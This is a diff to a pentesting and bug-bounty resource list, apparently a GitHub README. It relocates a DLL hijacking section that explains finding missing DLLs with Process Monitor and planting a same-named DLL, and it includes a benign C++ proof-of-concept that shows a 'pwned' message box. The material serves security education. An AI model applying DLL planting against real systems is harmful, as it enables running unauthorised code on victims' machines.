@@ -33,7 +33,6 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
   - [CORS](#cors)
   - [Deserialization](#deserialization)
   - [HTTP Host header attacks](#http-host-header-attacks)
-  - [DLL Hijacking](#dll-hijacking)
   - [Abusing S3 Bucket Permissions](#abusing-s3-bucket-permissions)
   - [GraphQL](#graphql)
   - [WordPress](#wordpress)
@@ -41,6 +40,8 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
   - [Lotus Domino](#lotus-domino)
   - [Git source code exposure](#git-source-code-exposure)
   - [Subdomain takeover](#subdomain-takeover)
+- [Thick client hacking](#thick-client-hacking)
+  - [DLL Hijacking](#dll-hijacking)
 
 <hr/>
 
@@ -761,41 +762,6 @@ curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Refere
 
 
 
-### <ins>DLL Hijacking</ins>
-
-**Tools**
-- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see which DLLs are missing for an exe and do DLL Hijacking
-
-Using Process Monitor, set the filters to find missing dlls.<br/><br/>
-  <img src="https://raw.githubusercontent.com/seeu-inspace/easyg/main/img/procmon-config.png" alt="procmon-config">
-
-After that, insert the dll in the position of the missing ones with the same name. An example of a dll:
-
-```c++
-#include <windows.h>
-
-BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
-    switch (dwReason)
-    {
-    case DLL_PROCESS_ATTACH:
-        MessageBox(NULL,
-            "success!!",
-            "pwned",
-            MB_ICONERROR | MB_OK
-        );
-        break;
-    }
-
-    return TRUE;
-}
-```
-
-**Resources**
-- [hijacklibs.net](https://hijacklibs.net/)
-- [Save the Environment (Variable)](https://www.wietzebeukema.nl/blog/save-the-environment-variables)
-
-
-
 ### <ins>Abusing S3 Bucket Permissions</ins>
 
 Target example: `http://[name_of_bucket].s3.amazonaws.com`
@@ -920,3 +886,41 @@ Once you have the source code, look for the secrets within the files.
 **Tools**
 - [Can I take over XYZ?](https://github.com/EdOverflow/can-i-take-over-xyz)
 - nuclei template `%USERPROFILE%\nuclei-templates\takeovers`
+
+
+
+
+## Thick client hacking
+
+### <ins>DLL Hijacking</ins>
+
+**Tools**
+- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see which DLLs are missing for an exe and do DLL Hijacking
+
+Using Process Monitor, set the filters to find missing dlls.<br/><br/>
+  <img src="https://raw.githubusercontent.com/seeu-inspace/easyg/main/img/procmon-config.png" alt="procmon-config">
+
+After that, insert the dll in the position of the missing ones with the same name. An example of a dll:
+
+```c++
+#include <windows.h>
+
+BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    switch (dwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+        MessageBox(NULL,
+            "success!!",
+            "pwned",
+            MB_ICONERROR | MB_OK
+        );
+        break;
+    }
+
+    return TRUE;
+}
+```
+
+**Resources**
+- [hijacklibs.net](https://hijacklibs.net/)
+- [Save the Environment (Variable)](https://www.wietzebeukema.nl/blog/save-the-environment-variables)
